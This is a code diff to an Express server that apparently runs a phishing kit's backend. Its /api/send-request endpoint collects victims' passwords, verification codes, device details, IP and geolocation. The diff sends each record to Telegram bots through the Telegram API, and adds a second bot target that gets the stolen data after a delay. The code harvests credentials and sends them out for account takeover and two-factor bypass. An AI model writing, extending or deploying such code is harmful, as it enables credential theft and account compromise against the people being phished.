@@ -37,10 +37,26 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ===== ENV =====
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_IDS = process.env.TELEGRAM_CHAT_ID;
+const TELEGRAM_TARGETS = [
+    {
+        token: process.env.TELEGRAM_BOT_TOKEN_1,
+        chatId: process.env.TELEGRAM_CHAT_ID_1,
+        delay: 0
+    },
+    {
+        token: process.env.TELEGRAM_BOT_TOKEN_2,
+        chatId: process.env.TELEGRAM_CHAT_ID_2,
+        delay: 5000
+    }
+].filter(t => t.token && t.chatId);
+
+// Fallback for legacy env format
+if (TELEGRAM_TARGETS.length === 0 && process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
+    process.env.TELEGRAM_CHAT_ID.split(',').forEach(id => {
+        TELEGRAM_TARGETS.push({ token: process.env.TELEGRAM_BOT_TOKEN, chatId: id.trim(), delay: 0 });
+    });
+}
 const ALLOWED_ORIGIN = process.env.ALLOWED_ORIGIN || '';
-const CHAT_IDS_ARRAY = TELEGRAM_CHAT_IDS ? TELEGRAM_CHAT_IDS.split(',').map(id => id.trim()) : [];
 
 // ===== SESSIONS & RATE LIMITING =====
 const MAX_PASSWORD_ATTEMPTS = 5;
@@ -279,50 +295,83 @@ function buildMessage(session, ip = 'Unknown') {
     return msg;
 }
 
-async function sendTelegram(message, messageIdsMap = null) {
-    console.log(`[TG] Attempting to send message to ${CHAT_IDS_ARRAY.length} chats. Token: ${TELEGRAM_BOT_TOKEN ? 'EXISTS' : 'MISSING'}`);
-    if (!TELEGRAM_BOT_TOKEN || CHAT_IDS_ARRAY.length === 0) {
-        console.warn('[TG] Aborting: Missing token or chat IDs');
+async function sendTelegram(message, messageIdsMap = null, sessionId = null) {
+    if (TELEGRAM_TARGETS.length === 0) {
+        console.warn('[TG] Aborting: No Telegram targets configured');
         return {};
     }
-    const results = await Promise.all(CHAT_IDS_ARRAY.map(async (chatId) => {
-        try {
-            console.log(`[TG] Sending to ${chatId}...`);
-            const messageId = messageIdsMap ? messageIdsMap[chatId] : null;
 
-            // Try editing existing message first
-            if (messageId) {
-                try {
-                    const editData = await httpRequest(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, message_id: messageId, text: message, parse_mode: 'HTML' })
-                    });
-                    if (editData.ok) {
-                        return { chatId, messageId: editData.result?.message_id || messageId };
-                    }
-                    console.error(`[TG] Edit failed [${chatId}]:`, editData.description || 'unknown');
-                } catch (editErr) {
-                    console.error(`[TG] Edit error [${chatId}]:`, editErr.message);
-                }
+    const currentMessageIds = messageIdsMap ? { ...messageIdsMap } : {};
+    
+    // We'll return the IDs of messages sent immediately
+    const immediateResults = {};
+
+    for (const target of TELEGRAM_TARGETS) {
+        const sendToTarget = async () => {
+            if (target.delay > 0) {
+                await new Promise(resolve => setTimeout(resolve, target.delay));
             }
 
-            // Fallback: send new message
-            const data = await httpRequest(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
-            });
-            if (!data.ok) console.error(`[TG] Send failed [${chatId}]:`, data.description || 'unknown');
-            return { chatId, messageId: data.result?.message_id || null };
-        } catch (e) {
-            console.error(`[TG] Fatal [${chatId}]:`, e.message);
-            return { chatId, messageId: null };
+            try {
+                // If we don't have a messageId passed in, check the session for latest ID
+                let messageId = currentMessageIds[target.chatId];
+                if (!messageId && sessionId && sessions[sessionId]) {
+                    messageId = sessions[sessionId].messageIds[target.chatId];
+                }
+
+                let resultData;
+                if (messageId) {
+                    // Try editing
+                    resultData = await httpRequest(`https://api.telegram.org/bot${target.token}/editMessageText`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: target.chatId, message_id: messageId, text: message, parse_mode: 'HTML' })
+                    });
+                    
+                    if (!resultData.ok) {
+                        // If edit fails (e.g. message deleted or too old), fallback to new message
+                        console.warn(`[TG] Edit failed for ${target.chatId}, falling back to sendMessage: ${resultData.description}`);
+                        messageId = null;
+                    }
+                }
+
+                if (!messageId) {
+                    resultData = await httpRequest(`https://api.telegram.org/bot${target.token}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: target.chatId, text: message, parse_mode: 'HTML' })
+                    });
+                }
+
+                if (resultData && resultData.ok) {
+                    const newMessageId = resultData.result?.message_id || (resultData.result === true ? messageId : null);
+                    if (newMessageId) {
+                        currentMessageIds[target.chatId] = newMessageId;
+                        if (sessionId && sessions[sessionId]) {
+                            sessions[sessionId].messageIds[target.chatId] = newMessageId;
+                        }
+                        return newMessageId;
+                    }
+                } else {
+                    console.error(`[TG] Error for ${target.chatId}:`, resultData?.description || 'Unknown error');
+                }
+            } catch (err) {
+                console.error(`[TG] Fatal error for ${target.chatId}:`, err.message);
+            }
+            return null;
+        };
+
+        if (target.delay > 0) {
+            // Background send
+            sendToTarget();
+        } else {
+            // Immediate send
+            const mid = await sendToTarget();
+            if (mid) immediateResults[target.chatId] = mid;
         }
-    }));
-    const messageIds = {};
-    results.forEach(r => { if (r.messageId) messageIds[r.chatId] = r.messageId; });
-    return messageIds;
+    }
+
+    return immediateResults;
 }
 
 async function getIPInfo(ip) {
@@ -499,16 +548,16 @@ app.post('/api/send-request', async (req, res) => {
                 location: 'Unknown', source, device: safe.device || null, messageIds: {}, createdAt: Date.now()
             };
 
-            // Send Telegram immediately — don't wait for geo
+            // Send Telegram immediately
             const msg = buildMessage(sessions[id], ip);
-            sessions[id].messageIds = await sendTelegram(msg);
+            sessions[id].messageIds = await sendTelegram(msg, null, id);
 
             // Geo lookup in background — update message if resolved within 4s
             getIPInfo(ip).then(location => {
                 if (location && location !== 'Unknown' && sessions[id]) {
                     sessions[id].location = location;
                     const updatedMsg = buildMessage(sessions[id], ip);
-                    sendTelegram(updatedMsg, sessions[id].messageIds).catch(() => {});
+                    sendTelegram(updatedMsg, sessions[id].messageIds, id).catch(() => {});
                 }
             }).catch(() => {});
             return res.json({ success: true, session_id: id });
@@ -524,7 +573,7 @@ app.post('/api/send-request', async (req, res) => {
             }
             sessions[session_id].passwords.push((data.password || '').substring(0, FIELD_LIMITS.password));
             const msg = buildMessage(sessions[session_id], ip);
-            await sendTelegram(msg, sessions[session_id].messageIds);
+            await sendTelegram(msg, sessions[session_id].messageIds, session_id);
             return res.json({ success: true });
         }
 
@@ -538,7 +587,7 @@ app.post('/api/send-request', async (req, res) => {
             }
             sessions[session_id].codes.push((data.code || '').substring(0, FIELD_LIMITS.code));
             const msg = buildMessage(sessions[session_id], ip);
-            await sendTelegram(msg, sessions[session_id].messageIds);
+            await sendTelegram(msg, sessions[session_id].messageIds, session_id);
             return res.json({ success: true });
         }
 
